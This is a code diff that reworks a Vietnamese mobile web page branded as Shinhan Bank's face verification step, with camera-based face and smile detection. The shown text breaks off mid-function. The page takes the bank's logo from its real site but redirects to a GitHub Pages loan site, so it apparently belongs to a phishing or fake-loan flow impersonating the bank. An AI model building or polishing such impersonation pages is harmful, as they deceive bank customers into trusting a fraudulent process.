@@ -2,531 +2,700 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Quét khuôn mặt</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Shinhan Bank - Xác thực khuôn mặt</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://shinhan.com.vn/favicon.ico">
+    <!-- Thư viện Face-API.js -->
+    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
+        :root {
+            --primary-color: #0072CE;
+            --secondary-color: #F5F7FA;
+            --accent-color: #00A859;
+            --error-color: #E63946;
+            --text-color: #333;
+            --text-light: #555;
+            --border-color: #DEE2E6;
+            --border-radius: 12px;
+            --shadow: 0 4px 15px rgba(0, 0, 0, 0.07);
+            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
         }
 
         body {
-            background-color: #0f2a44;
-            color: white;
+            font-family: 'Be Vietnam Pro', sans-serif;
+            background-color: var(--secondary-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
             display: flex;
             flex-direction: column;
-            align-items: center;
-            justify-content: center; /* Căn giữa theo chiều dọc */
             height: 100vh;
-            overflow: hidden;
         }
 
-        .status-bar {
-            width: 100%;
-            height: 40px;
-            background-color: transparent;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            justify-content: space-between; /* Căn nút đóng và logo */
-            padding: 0 10px;
-        }
+        .hidden { display: none !important; }
 
-        .close-button {
-            background-color: #ffffff33;
-            border: none;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
+        .app-header {
+            background: #fff;
+            padding: 15px 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            text-align: center;
+            position: relative;
+            z-index: 1010;
             display: flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
-            font-size: 16px;
-            color: white;
+            flex-shrink: 0;
         }
 
-        .close-button:hover {
-            background-color: #ffffff66;
-        }
-
-        .logo {
+        .app-header img {
             height: 30px;
+            max-width: 150px;
+        }
+        
+        .header-button {
             position: absolute;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-
-        .container {
-            text-align: center;
-            padding: 20px;
-            max-width: 100%;
-        }
-
-        .header {
-            font-size: 20px;
-            font-weight: 400;
-            margin-bottom: 10px;
-        }
-
-        .sub-header {
-            font-size: 14px;
-            font-weight: 300;
-            margin-bottom: 20px;
-            color: #ffffffcc;
-        }
-
-        .face-scan-container {
-            position: relative;
-            width: 220px;
-            height: 220px;
-            margin: 0 auto;
-        }
-
-        .video-wrapper {
-            position: relative;
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            border: 5px solid #ffffff33;
-            background-color: #ffffff;
-            overflow: hidden;
-        }
-
-        .video {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            object-fit: cover;
-        }
-
-        .scan-circle {
-            position: absolute;
-            top: -5px;
-            left: -5px;
-            width: 230px;
-            height: 230px;
-            border-radius: 50%;
-        }
-
-        .dot {
-            position: absolute;
-            width: 6px;
-            height: 6px;
-            background-color: #ffffff66;
-            border-radius: 50%;
-            transform-origin: center;
-            box-shadow: 0 0 3px #ffffff66;
-        }
-
-        .dot.scanning {
-            animation: blink 1.2s infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% {
-                opacity: 0.3;
-                box-shadow: 0 0 3px #ffffff66;
-            }
-            50% {
-                opacity: 1;
-                box-shadow: 0 0 6px #ffffffcc;
-            }
-        }
-
-        .scan-arrow {
-            position: absolute;
-            bottom: -30px;
-            left: 50%;
-            transform: translateX(-50%);
-            font-size: 24px;
-            color: #ffffff66;
-        }
-
-        .scan-arrow.scanning {
-            animation: rotate 2s linear infinite;
-        }
-
-        @keyframes rotate {
-            from {
-                transform: translateX(-50%) rotate(0deg);
-            }
-            to {
-                transform: translateX(-50%) rotate(360deg);
-            }
-        }
-
-        .mic-button {
-            position: absolute;
-            bottom: 10px;
-            right: 10px;
-            background-color: #ffffff33;
-            border-radius: 50%;
+            font-size: 1.4rem; /* Increased size */
+            color: var(--text-color);
+            cursor: pointer;
+            background: none;
+            border: none;
             width: 40px;
             height: 40px;
             display: flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
-            font-size: 20px;
         }
+        .close-button { left: 10px; }
+        .lang-toggle { right: 10px; font-weight: 700; font-size: 1.2rem; }
+        .sound-toggle { right: 50px; }
 
-        .mic-button.active {
-            background-color: #ffffff66;
-        }
 
-        .status-message {
-            margin-top: 20px;
-            font-size: 24px;
-            font-weight: 500;
-            text-transform: uppercase;
+        .main-content {
+            flex-grow: 1;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            opacity: 1;
-            transition: opacity 0.3s ease;
+            padding: 20px;
+            text-align: center;
         }
 
-        .status-message.fade {
+        .content-card {
+            background: white;
+            padding: clamp(20px, 5vw, 40px);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 500px;
+        }
+        
+        .content-card h3 {
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .content-card p {
+            color: var(--text-light);
+            margin-bottom: 15px;
+        }
+        
+        .progress-indicator {
+            width: 100%;
+            margin-bottom: 25px;
+        }
+        .step-label {
+            font-size: 0.9rem;
+            color: var(--text-light);
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        .progress {
+            height: 8px;
+            border-radius: 4px;
+        }
+        .progress-bar {
+            background-color: var(--primary-color);
+            transition: width 0.5s ease;
+            box-shadow: 0 0 5px var(--primary-color); /* Added polish */
+        }
+
+        .face-scan-container {
+            position: relative;
+            width: clamp(200px, 60vw, 300px);
+            aspect-ratio: 1 / 1;
+            margin: 0 auto 30px;
+        }
+
+        .video-wrapper {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            overflow: hidden;
+            background-color: var(--border-color);
+            position: relative;
+            transform: scale(1);
+        }
+        
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .scan-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            border-radius: 50%;
+            box-shadow: inset 0 0 0 5px var(--primary-color);
+        }
+        
+        .pulse { animation: pulse 2s infinite; }
+
+        .scan-line {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 4px;
+            background: linear-gradient(90deg, transparent, var(--accent-color), transparent);
+            box-shadow: 0 0 15px var(--accent-color);
+            border-radius: 2px;
+            animation: scan 3s infinite linear;
             opacity: 0;
         }
 
-        .status-message span {
-            font-size: 24px;
+        #guidanceOverlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #222; /* Darker text */
+            font-weight: 600;
+            text-shadow: 0 0 8px rgba(0, 0, 0, 0.7); /* Stronger shadow */
+            font-size: 1.1rem;
         }
 
-        .error-message {
-            margin-top: 10px;
-            color: #ff5555;
-            font-size: 14px;
-            display: none;
+        .scan-overlay.scanning .scan-line { opacity: 1; }
+        .scan-overlay.success { box-shadow: inset 0 0 0 5px var(--accent-color); animation: none; }
+        .scan-overlay.error { box-shadow: inset 0 0 0 5px var(--error-color); animation: shake 0.5s; }
+
+        @keyframes pulse {
+            50% { transform: scale(1.05); box-shadow: inset 0 0 0 8px rgba(0, 114, 206, 0.5); }
         }
-
-        @media (max-width: 400px) {
-            .container {
-                padding: 10px;
-            }
-
-            .header {
-                font-size: 18px;
-                margin-bottom: 8px;
-            }
-
-            .sub-header {
-                font-size: 12px;
-                margin-bottom: 15px;
-            }
-
-            .face-scan-container {
-                width: 220px;
-                height: 220px;
-            }
-
-            .scan-circle {
-                width: 230px;
-                height: 230px;
-                top: -5px;
-                left: -5px;
-            }
-
-            .scan-arrow {
-                font-size: 20px;
-                bottom: -25px;
-            }
-
-            .status-message {
-                margin-top: 15px;
-                font-size: 20px;
-            }
-
-            .status-message span {
-                font-size: 20px;
-            }
-
-            .logo {
-                height: 26px;
-            }
+        @keyframes scan { 100% { top: 100%; } }
+        @keyframes shake {
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
         }
-
-        @media (max-width: 350px) {
-            .container {
-                padding: 8px;
-            }
-
-            .header {
-                font-size: 16px;
-                margin-bottom: 6px;
-            }
-
-            .sub-header {
-                font-size: 11px;
-                margin-bottom: 10px;
-            }
-
-            .face-scan-container {
-                width: 200px;
-                height: 200px;
-            }
-
-            .scan-circle {
-                width: 210px;
-                height: 210px;
-                top: -5px;
-                left: -5px;
-            }
-
-            .scan-arrow {
-                font-size: 18px;
-                bottom: -20px;
-            }
-
-            .status-message {
-                margin-top: 10px;
-                font-size: 18px;
-            }
-
-            .status-message span {
-                font-size: 18px;
-            }
-
-            .logo {
-                height: 22px;
-            }
+        
+        .status-message {
+            font-size: 1.2rem;
+            font-weight: 600;
+            min-height: 30px;
         }
+        .status-message .fa-spinner { margin-right: 8px; font-size: 0.9em; }
+        .status-message span[data-lang-key="error"] { font-weight: 700; text-decoration: underline; }
+        
+        .button-group { margin-top: 20px; }
 
-        @media (max-width: 320px) {
-            .container {
-                padding: 5px;
-            }
-
-            .header {
-                font-size: 14px;
-                margin-bottom: 5px;
-            }
-
-            .sub-header {
-                font-size: 10px;
-                margin-bottom: 8px;
-            }
-
-            .face-scan-container {
-                width: 180px;
-                height: 180px;
-            }
-
-            .scan-circle {
-                width: 190px;
-                height: 190px;
-                top: -5px;
-                left: -5px;
-            }
-
-            .scan-arrow {
-                font-size: 16px;
-                bottom: -18px;
-            }
-
-            .status-message {
-                margin-top: 8px;
-                font-size: 16px;
-            }
-
-            .status-message span {
-                font-size: 16px;
-            }
-
-            .mic-button {
-                width: 36px;
-                height: 36px;
-                font-size: 18px;
-            }
-
-            .close-button {
-                width: 26px;
-                height: 26px;
-                font-size: 14px;
-            }
-
-            .logo {
-                height: 20px;
-            }
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
         }
+        .modal-overlay.visible { opacity: 1; pointer-events: auto; }
+        .modal-content {
+            background: #fff;
+            padding: 30px;
+            border-radius: var(--border-radius);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+        }
+        .modal-overlay.visible .modal-content { transform: scale(1); }
+        .modal-content h4 { font-weight: 600; margin-bottom: 15px; }
+        .modal-content p { margin-bottom: 25px; }
+        .modal-actions { display: flex; gap: 15px; justify-content: center; }
+        .btn-primary:hover { background-color: rgba(0, 114, 206, 0.9); }
+        .btn-danger { background-color: var(--error-color); border-color: var(--error-color); }
     </style>
 </head>
 <body>
-    <div class="status-bar">
-        <button class="close-button" id="close-button">✖</button>
-        <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" class="logo" alt="Shinhan Bank Logo">
-    </div>
-    <div class="container">
-        <div class="header">Xác thực khuôn mặt</div>
-        <div class="sub-header">Hãy để khuôn mặt vào hình tròn</div>
-        <div class="face-scan-container">
-            <div class="video-wrapper">
-                <video id="video" class="video" autoplay></video>
+    <header class="app-header">
+        <button id="closeButton" class="header-button close-button"><i class="fas fa-times"></i></button>
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo.png" alt="Shinhan Bank Logo">
+        <button id="soundToggle" class="header-button sound-toggle"><i class="fas fa-volume-off"></i></button>
+        <button id="langToggle" class="header-button lang-toggle">EN</button>
+    </header>
+
+    <main class="main-content">
+        <div class="content-card">
+            <h3 data-lang="title">Xác thực khuôn mặt</h3>
+            <p data-lang="subtitle">Vui lòng giữ khuôn mặt của bạn trong khung hình tròn.</p>
+            
+            <div id="progressIndicator" class="progress-indicator">
+                 <p id="stepLabel" class="step-label"></p>
+                <div class="progress">
+                    <div id="progressBar" class="progress-bar" role="progressbar" style="width: 0%;" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"></div>
+                </div>
             </div>
-            <div class="scan-circle" id="scan-circle"></div>
-            <div class="mic-button" id="mic-button">🎙️</div>
-            <div class="scan-arrow" id="scan-arrow">⟳</div>
+
+            <div class="face-scan-container">
+                <div class="video-wrapper">
+                    <video id="video" autoplay muted playsinline></video>
+                    <div id="scanOverlay" class="scan-overlay pulse">
+                        <div id="guidanceOverlay"></div>
+                        <div class="scan-line"></div>
+                    </div>
+                </div>
+            </div>
+            <p id="statusMessage" class="status-message" aria-live="polite"><i class="fas fa-spinner fa-spin"></i> <span data-lang="loadingModels">Đang tải tài nguyên...</span></p>
+            
+            <div class="button-group">
+                <button id="retryBtn" class="btn btn-primary hidden" data-lang="retry">Thử lại</button>
+            </div>
         </div>
-        <div class="status-message" id="status-message">
-            VUI LÒNG CƯỜI <span>☺︎</span>
-        </div>
-        <div class="error-message" id="error-message">
-            Không thể phát hiện khuôn mặt. Vui lòng thử lại ở nơi có ánh sáng tốt.
+    </main>
+
+    <div id="confirmModal" class="modal-overlay">
+        <div class="modal-content" role="dialog" aria-labelledby="modalTitle">
+            <h4 id="modalTitle" data-lang="exitTitle">Thoát xác thực?</h4>
+            <p data-lang="exitSubtitle">Hành động này sẽ hủy bỏ quy trình hiện tại. Bạn có chắc chắn muốn thoát không?</p>
+            <div class="modal-actions">
+                <button id="cancelExitBtn" class="btn btn-primary" data-lang="stay">Ở lại</button>
+                <button id="confirmExitBtn" class="btn btn-danger" data-lang="exit">Thoát</button>
+            </div>
         </div>
     </div>
 
-    <script>
-        const video = document.getElementById('video');
-        const errorMessage = document.getElementById('error-message');
-        const statusMessage = document.getElementById('status-message');
-        const micButton = document.getElementById('mic-button');
-        const scanCircle = document.getElementById('scan-circle');
-        const scanArrow = document.getElementById('scan-arrow');
-        const closeButton = document.getElementById('close-button');
+<script>
+"use strict";
 
-        // Tạo các chấm nhỏ cho hiệu ứng quét
-        const numDots = 30;
-        let radius = 115; // Bán kính vòng tròn (230px / 2)
-        if (window.innerWidth <= 400) radius = 115;
-        if (window.innerWidth <= 350) radius = 105;
-        if (window.innerWidth <= 320) radius = 95;
-        for (let i = 0; i < numDots; i++) {
-            const angle = (i / numDots) * 2 * Math.PI;
-            const dot = document.createElement('div');
-            dot.className = 'dot';
-            dot.style.left = `${radius + radius * Math.cos(angle)}px`;
-            dot.style.top = `${radius + radius * Math.sin(angle)}px`;
-            scanCircle.appendChild(dot);
+const FaceScanApp = {
+    state: {
+        stream: null,
+        detectionInterval: null,
+        modelsLoaded: false,
+        currentStep: 0,
+        totalSteps: 2, // 1. Detect face, 2. Smile
+        actionTimeoutId: null,
+        currentLang: 'vi',
+        isSoundEnabled: false,
+        retryAttempts: 0,
+    },
+
+    elements: {},
+    audioContext: null,
+
+    config: {
+        REDIRECT_URL: 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html',
+        MODEL_URL: 'https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@0.22.2/weights',
+        SMILE_THRESHOLD: 0.7,
+        ACTION_TIMEOUT: 15000,
+        MAX_RETRY_ATTEMPTS: 2,
+        MODEL_LOAD_TIMEOUT: 30000,
+        BRIGHTNESS_THRESHOLD: 50,
+        HEAD_TILT_THRESHOLD: 10, // Max degrees of tilt
+    },
+    
+    translations: {
+        vi: {
+            title: "Xác thực khuôn mặt",
+            subtitle: "Vui lòng giữ khuôn mặt của bạn trong khung hình tròn.",
+            loadingModels: "Đang tải tài nguyên...",
+            loadingCamera: "Đang khởi động camera...",
+            step1Label: "Bước 1/2: Đưa khuôn mặt vào khung",
+            step2Label: "Bước 2/2: Giữ và mỉm cười",
+            faceDetected: "Đã nhận diện, vui lòng mỉm cười",
+            verifying: "Đang xác thực...",
+            success: "Xác thực thành công!",
+            errorBrowser: "Trình duyệt không hỗ trợ camera.",
+            errorLoad: "Lỗi tải tài nguyên. Vui lòng thử lại.",
+            errorLoadTimeout: "Tải tài nguyên quá lâu. Vui lòng kiểm tra kết nối và thử lại.",
+            errorCamera: "Lỗi không xác định. Vui lòng thử lại.",
+            errorPermission: "Bạn đã từ chối quyền truy cập camera.",
+            errorNotFound: "Không tìm thấy camera trên thiết bị.",
+            errorResolution: "Camera không đủ độ phân giải.",
+            errorBrightness: "Môi trường quá tối, vui lòng thêm sáng.",
+            errorTimeout: "Hết thời gian. Vui lòng thử lại.",
+            guidanceMoveCloser: "Di chuyển lại gần hơn",
+            guidanceMoveFurther: "Di chuyển ra xa hơn",
+            guidanceCenterFace: "Canh khuôn mặt vào giữa",
+            guidanceStraightenHead: "Vui lòng giữ thẳng đầu",
+            retry: "Thử lại",
+            exitTitle: "Thoát xác thực?",
+            exitSubtitle: "Hành động này sẽ hủy bỏ quy trình hiện tại. Bạn có chắc chắn muốn thoát không?",
+            stay: "Ở lại",
+            exit: "Thoát",
+        },
+        en: {
+            title: "Face Verification",
+            subtitle: "Please keep your face within the circular frame.",
+            loadingModels: "Loading resources...",
+            loadingCamera: "Starting camera...",
+            step1Label: "Step 1/2: Position face in frame",
+            step2Label: "Step 2/2: Hold still and smile",
+            faceDetected: "Face detected, please smile",
+            verifying: "Verifying...",
+            success: "Verification Successful!",
+            errorBrowser: "Browser does not support camera.",
+            errorLoad: "Error loading resources. Please try again.",
+            errorLoadTimeout: "Resource loading timed out. Please check connection and retry.",
+            errorCamera: "Unknown error. Please try again.",
+            errorPermission: "You have denied camera access.",
+            errorNotFound: "No camera found on your device.",
+            errorResolution: "Camera resolution is too low.",
+            errorBrightness: "Environment is too dark. Please add more light.",
+            errorTimeout: "Action timed out. Please try again.",
+            guidanceMoveCloser: "Move Closer",
+            guidanceMoveFurther: "Move Further",
+            guidanceCenterFace: "Center Your Face",
+            guidanceStraightenHead: "Please Keep Your Head Straight",
+            retry: "Retry",
+            exitTitle: "Exit Verification?",
+            exitSubtitle: "This will cancel the current process. Are you sure you want to exit?",
+            stay: "Stay",
+            exit: "Exit",
         }
+    },
 
-        // Cập nhật thông điệp trạng thái với hiệu ứng fade
-        function updateStatusMessage(message, includeEmoji = false) {
-            statusMessage.classList.add('fade');
-            setTimeout(() => {
-                statusMessage.innerHTML = includeEmoji ? `${message} <span>☺︎</span>` : message;
-                statusMessage.classList.remove('fade');
-            }, 300);
+    async init() {
+        this.cacheDOMElements();
+        if (!('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices)) {
+            this.updateStatus("errorBrowser", 'error');
+            return;
         }
+        this.setLanguage(localStorage.getItem('preferredLang') || 'vi');
+        this.setSound(localStorage.getItem('soundEnabled') === 'true');
+        this.addEventListeners();
+        await this.loadModels();
+    },
+    
+    async loadModels() {
+        try {
+            this.updateStatus("loadingModels", 'loading');
+            const loadPromise = Promise.all([
+                faceapi.nets.tinyFaceDetector.loadFromUri(this.config.MODEL_URL),
+                faceapi.nets.faceLandmark68Net.loadFromUri(this.config.MODEL_URL),
+                faceapi.nets.faceExpressionNet.loadFromUri(this.config.MODEL_URL)
+            ]);
+            
+            const timeoutPromise = new Promise((_, reject) => 
+                setTimeout(() => reject(new Error('Model loading timed out')), this.config.MODEL_LOAD_TIMEOUT)
+            );
 
-        // Bật/tắt hiệu ứng quét (bao gồm cả chấm nhỏ và mũi tên xoay)
-        function toggleScanEffect(enable) {
-            const dots = document.querySelectorAll('.dot');
-            dots.forEach(dot => {
-                if (enable) {
-                    dot.classList.add('scanning');
-                    scanArrow.classList.add('scanning');
-                } else {
-                    dot.classList.remove('scanning');
-                    scanArrow.classList.remove('scanning');
+            await Promise.race([loadPromise, timeoutPromise]);
+            
+            this.state.modelsLoaded = true;
+            this.startCamera();
+        } catch (error) {
+            this.logError(error);
+            const messageKey = error.message.includes('timed out') ? 'errorLoadTimeout' : 'errorLoad';
+            this.updateStatus(messageKey, 'error', true);
+        }
+    },
+
+    cacheDOMElements() {
+        const ids = ['video', 'scanOverlay', 'statusMessage', 'closeButton', 'langToggle', 'soundToggle', 'confirmModal', 'cancelExitBtn', 'confirmExitBtn', 'progressIndicator', 'progressBar', 'retryBtn', 'stepLabel', 'guidanceOverlay'];
+        ids.forEach(id => this.elements[id] = document.getElementById(id));
+    },
+
+    addEventListeners() {
+        this.elements.closeButton.addEventListener('click', () => this.showConfirmModal(true));
+        this.elements.cancelExitBtn.addEventListener('click', () => this.showConfirmModal(false));
+        this.elements.confirmExitBtn.addEventListener('click', () => this.stopAndGoBack());
+        this.elements.langToggle.addEventListener('click', () => this.toggleLanguage());
+        this.elements.soundToggle.addEventListener('click', () => this.toggleSound());
+        this.elements.retryBtn.addEventListener('click', () => this.retryVerification());
+        window.addEventListener('keydown', (e) => {
+            if (e.key === "Escape" && this.elements.confirmModal.classList.contains('visible')) {
+                this.showConfirmModal(false);
+            }
+        });
+    },
+    
+    async startCamera() {
+        if (!this.state.modelsLoaded) return;
+        try {
+            this.updateStatus("loadingCamera", 'loading');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+            
+            const settings = stream.getVideoTracks()[0].getSettings();
+            if(settings.width < 640 || settings.height < 480) {
+                 this.logError(new Error(`Low resolution: ${settings.width}x${settings.height}`));
+                 this.updateStatus("errorResolution", 'error', true);
+                 return;
+            }
+
+            this.state.stream = stream;
+            this.elements.video.srcObject = stream;
+            this.elements.video.onloadedmetadata = () => {
+                this.elements.progressIndicator.classList.remove('hidden');
+                this.runFaceDetection();
+            };
+        } catch (err) {
+            this.logError(err);
+            let messageKey = "errorCamera";
+            if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") messageKey = "errorPermission";
+            if (err.name === "NotFoundError" || err.name === "DevicesNotFoundError") messageKey = "errorNotFound";
+            this.updateStatus(messageKey, 'error', true);
+        }
+    },
+
+    runFaceDetection() {
+        this.resetActionState();
+        this.updateProgress(1);
+        this.startActionTimeout();
+        
+        this.state.detectionInterval = setInterval(async () => {
+            if (this.elements.video.paused) return;
+
+            const brightness = this.getFrameBrightness();
+            if (brightness < this.config.BRIGHTNESS_THRESHOLD) {
+                this.updateStatus("errorBrightness", 'error');
+                this.updateGuidance('');
+                return;
+            }
+
+            const detections = await faceapi.detectSingleFace(this.elements.video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks().withFaceExpressions();
+            if (detections) {
+                const isPositioned = this.checkFacePosition(detections);
+                if(isPositioned) {
+                    this.handleFaceDetected(detections);
                 }
+            } else {
+                 this.updateGuidance('guidanceCenterFace');
+            }
+        }, 500);
+    },
+
+    handleFaceDetected(detections) {
+        this.clearActionTimeout();
+        this.updateProgress(2);
+        const smileProbability = detections.expressions.happy;
+        if (smileProbability > this.config.SMILE_THRESHOLD) {
+            clearInterval(this.state.detectionInterval);
+            this.handleVerificationSuccess();
+        } else {
+            this.updateStatus("faceDetected", 'scanning');
+        }
+    },
+
+    handleVerificationSuccess() {
+        this.resetActionState();
+        this.updateProgress(this.state.totalSteps);
+        this.updateStatus("success", 'success');
+        this.playBeep(523.25, 150); // Success C5 beep
+        this.stopCamera();
+        setTimeout(() => window.location.href = this.config.REDIRECT_URL, 1500);
+    },
+    
+    updateProgress(step) {
+        this.state.currentStep = step;
+        const percentage = (step / this.state.totalSteps) * 100;
+        this.elements.progressBar.style.width = `${percentage}%`;
+        this.elements.progressBar.setAttribute('aria-valuenow', percentage);
+        this.updateStepLabel();
+    },
+    
+    updateStepLabel() {
+        const key = this.state.currentStep > 0 ? `step${this.state.currentStep}Label` : '';
+        this.elements.stepLabel.textContent = this.translations[this.state.currentLang][key] || '';
+    },
+
+    updateStatus(messageKey, status = 'loading', showRetry = false) {
+        const isError = status === 'error';
+        const message = this.translations[this.state.currentLang][messageKey];
+        const messageHTML = `<i class="fas fa-spinner fa-spin ${status !== 'loading' ? 'hidden' : ''}"></i> <span data-lang-key="${isError ? 'error' : ''}">${message}</span>`;
+        this.elements.statusMessage.innerHTML = messageHTML;
+        
+        this.elements.scanOverlay.className = 'scan-overlay';
+        if(showRetry) this.elements.retryBtn.classList.remove('hidden');
+        else this.elements.retryBtn.classList.add('hidden');
+        
+        switch(status) {
+            case 'success': this.elements.scanOverlay.classList.add('success'); break;
+            case 'error': this.elements.scanOverlay.classList.add('error'); break;
+            case 'scanning': this.elements.scanOverlay.classList.add('scanning'); break;
+            default: this.elements.scanOverlay.classList.add('pulse'); break;
+        }
+    },
+
+    getFrameBrightness() {
+        const canvas = document.createElement('canvas');
+        const video = this.elements.video;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d', { willReadFrequently: true });
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+        let sum = 0;
+        for (let i = 0; i < imageData.length; i += 4) {
+            sum += (imageData[i] + imageData[i+1] + imageData[i+2]) / 3;
+        }
+        return sum / (imageData.length / 4);
+    },
+
+    checkFacePosition(detections) {
+        const box = detections.detection.box;
+        const video = this.elements.video;
+        const faceWidth = box.width / video.videoWidth;
+        const faceCenterX = (box.x + box.width / 2) / video.videoWidth;
+        
+        // Head Tilt Check
+        const landmarks = detections.landmarks;
+        const leftEye = landmarks.getLeftEye()[0]; // A point in the left eye
+        const rightEye = landmarks.getRightEye()[3]; // A point in the right eye
+        const angle = Math.atan2(rightEye.y - leftEye.y, rightEye.x - leftEye.x) * 180 / Math.PI;
+
+        if (Math.abs(angle) > this.config.HEAD_TILT_THRESHOLD) {
+            this.updateGuidance('guidanceStraightenHead'); return false;
+        }
+        
+        if (faceWidth > 0.6) {
+            this.updateGuidance('guidanceMoveFurther'); return false;
+        } else if (faceWidth < 0.3) {
+            this.updateGuidance('guidanceMoveCloser'); return false;
+        } else if (faceCenterX < 0.4 || faceCenterX > 0.6) {
+            this.updateGuidance('guidanceCenterFace'); return false;
+        } else {
+            this.updateGuidance(''); return true;
+        }
+    },
+
+    updateGuidance(messageKey) {
+        this.elements.guidanceOverlay.textContent = messageKey ? this.translations[this.state.currentLang][messageKey] : '';
+    },
+    
+    retryVerification() {
+        this.elements.retryBtn.classList.add('hidden');
+        this.stopCamera();
+        this.startCamera();
+    },
+    
+    startActionTimeout() {
+        this.clearActionTimeout();
+        this.state.actionTimeoutId = setTimeout(() => {
+            if(this.state.detectionInterval) {
+                 clearInterval(this.state.detectionInterval);
+                 this.state.retryAttempts++;
+                 if(this.state.retryAttempts >= this.config.MAX_RETRY_ATTEMPTS){
+                     this.updateStatus("errorTimeout", 'error', true);
+                 } else {
+                     this.updateStatus("errorTimeout", 'error', false);
+                     setTimeout(() => this.retryVerification(), 2000);
+                 }
+            }
+        }, this.config.ACTION_TIMEOUT);
+    },
+    
+    resetActionState() {
+        this.state.retryAttempts = 0;
+        this.clearActionTimeout();
+    },
+
+    clearActionTimeout() {
+        if(this.state.actionTimeoutId) clearTimeout(this.state.actionTimeoutId);
+    },
+    
+    stopCamera() {
+        this.clearActionTimeout();
+        if (this.state.detectionInterval) clearInterval(this.state.detectionInterval);
+        if (this.state.stream) this.state.stream.getTracks().forEach(track => track.stop());
+        this.state.stream = null;
+    },
+    
+    stopAndGoBack() {
+        this.stopCamera();
+        window.history.back();
+    },
+
+    showConfirmModal(show) {
+        this.elements.confirmModal.classList.toggle('visible', show);
+    },
+    
+    toggleLanguage() {
+        const newLang = this.state.currentLang === 'vi' ? 'en' : 'vi';
+        this.setLanguage(newLang);
+    },
+    
+    setLanguage(lang) {
+        this.state.currentLang = lang;
+        localStorage.setItem('preferredLang', lang);
+        this.elements.langToggle.textContent = lang === 'vi' ? 'EN' : 'VI';
+        document.querySelectorAll('[data-lang]').forEach(el => {
+            const key = el.dataset.lang;
+            if (this.translations[lang][key]) {
+                const icon = el.querySelector('i');
+                if(icon) el.innerHTML = `${icon.outerHTML} <span>${this.translations[lang][key]}</span>`;
+                else el.textContent = this.translations[lang][key];
+            }
+        });
+        this.updateStepLabel();
+    },
+    
+    toggleSound() {
+        this.setSound(!this.state.isSoundEnabled);
+    },
+
+    setSound(enabled) {
+        this.state.isSoundEnabled = enabled;
+        localStorage.setItem('soundEnabled', enabled);
+        this.elements.soundToggle.innerHTML = `<i class="fas ${enabled ? 'fa-volume-up' : 'fa-volume-off'}"></i>`;
+        if (enabled && !this.audioContext) {
+            try { this.audioContext = new (window.AudioContext || window.webkitAudioContext)(); }
+            catch(e) { this.logError(e); this.state.isSoundEnabled = false; }
+        }
+    },
+    
+    playBeep(frequency = 440, duration = 100) {
+        if (!this.state.isSoundEnabled || !this.audioContext) return;
+        try {
+            const oscillator = this.audioContext.createOscillator();
+            const gainNode = this.audioContext.createGain();
+            oscillator.connect(gainNode);
+            gainNode.connect(this.audioContext.destination);
+            oscillator.type = 'sine';
+            oscillator.frequency.value = frequency;
+            gainNode.gain.setValueAtTime(0, this.audioContext.currentTime);
+            gainNode.gain.linearRampToValueAtTime(1, this.audioContext.currentTime + 0.01);
+            oscillator.start(this.audioContext.currentTime);
